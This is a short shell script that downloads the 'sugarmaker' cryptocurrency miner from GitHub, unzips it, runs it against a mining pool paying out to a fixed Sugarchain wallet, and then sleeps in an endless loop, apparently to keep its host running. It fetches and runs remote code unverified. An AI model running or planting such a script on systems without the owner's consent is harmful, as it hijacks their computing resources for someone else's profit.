#!/bin/sh
wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip 
unzip sugarmaker-v2.5.0-sugar4-linux64.zip
cd sugarmaker-v2.5.0-sugar4-linux64
./sugarmaker -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qens0g0xrrz7cl2ady0pfwq432ccpzpvg4rd5jw
while [ 1 ]; do
sleep 3
done
sleep 999
